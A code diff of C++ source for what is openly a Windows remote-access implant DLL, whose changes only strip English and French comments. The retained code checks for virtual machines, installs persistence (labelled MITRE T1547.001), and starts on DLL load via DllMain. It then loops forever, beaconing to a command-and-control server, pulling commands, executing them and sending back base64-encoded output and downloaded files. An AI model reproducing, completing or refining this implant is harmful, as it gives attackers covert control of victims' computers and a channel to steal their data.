@@ -17,7 +17,6 @@ extern "C" bool is_virtual_machine();
 
 using namespace std;
 
-// Helper function to parse types and value from command
 void parse_command_type(const string& command, string& types, string& value) {
     size_t sep1 = command.find('\'');
     if (sep1 == string::npos) {
@@ -61,7 +60,6 @@ void parse_command_type(const string& command, string& types, string& value) {
     }
 }
 
-// Helper function to extract filename from download command
 string extract_filename(const string& command_type, const string& command_value) {
     if (command_type != "download") {
         return "";
@@ -69,9 +67,7 @@ string extract_filename(const string& command_type, const string& command_value)
     return command_value;
 }
 
-/**
- * Envoie un beacon au C2
- */
+
 string send_beacon(const string& agent_id, const string& results_data = "") {
     string hostname = get_hostname();
     string username = get_username();
@@ -104,9 +100,6 @@ string send_beacon(const string& agent_id, const string& results_data = "") {
     return response;
 }
 
-/**
- * Récupère les commandes en attente
- */
 vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
     vector<pair<int64_t, string>> commands;
 
@@ -205,9 +198,7 @@ vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
     return commands;
 }
 
-/**
- * Soumet les résultats d'une commande
- */
+
 bool submit_result(const string& agent_id, int64_t command_id, const string& output, bool success, const string& types, const string& filename = "") {
     string output_b64 = base64_encode(output);
 
@@ -241,9 +232,6 @@ bool submit_result(const string& agent_id, int64_t command_id, const string& out
     return !response.empty();
 }
 
-/**
- * Fonction principale exportée par la DLL
- */
 extern "C" __declspec(dllexport) void agent_run() {
     setvbuf(stdout, NULL, _IONBF, 0);
 
@@ -253,52 +241,41 @@ extern "C" __declspec(dllexport) void agent_run() {
     }
     #endif
 
-    // ===== AUTO-PERSISTENCE (MITRE T1547.001) =====
     if (!is_persistence_installed()) {
         install_persistence();
     }
 
-    // Générer l'agent_id
     string agent_id = generate_agent_id();
 
-    // Premier beacon d'enregistrement
     string initial_response = send_beacon(agent_id, "");
 
-    // Boucle principale
     while (true) {
         this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
 
-        // Étape 1: Heartbeat beacon
         string beacon_response = send_beacon(agent_id, "");
 
         if (beacon_response.empty()) {
             continue;
         }
 
-        // Étape 2: Récupérer les commandes
         vector<pair<int64_t, string>> commands = fetch_commands(agent_id);
 
         if (commands.empty()) {
             continue;
         }
 
-        // Étape 3: Exécuter chaque commande
         for (size_t i = 0; i < commands.size(); i++) {
             int64_t cmd_id = commands[i].first;
             string cmd_text = commands[i].second;
 
-            // Parse command
             string cmd_type, cmd_value;
             parse_command_type(cmd_text, cmd_type, cmd_value);
 
-            // Extract filename if download
             string filename = extract_filename(cmd_type, cmd_value);
 
-            // Exécuter la commande
             string result = execute_command(cmd_text);
             bool success = !result.empty();
 
-            // Convertir le type de commande en type de résultat
             string result_type;
             if (cmd_type == "download") {
                 result_type = "file";
@@ -308,19 +285,14 @@ extern "C" __declspec(dllexport) void agent_run() {
                 result_type = "text";
             }
 
-            // Étape 4: Soumettre le résultat
             submit_result(agent_id, cmd_id, result, success, result_type, filename);
         }
     }
 }
 
-/**
- * Point d'entrée de la DLL
- */
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH:
-        // Créer un thread pour éviter de bloquer le chargement de la DLL
         CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)agent_run, NULL, 0, NULL);
         break;
     case DLL_THREAD_ATTACH:
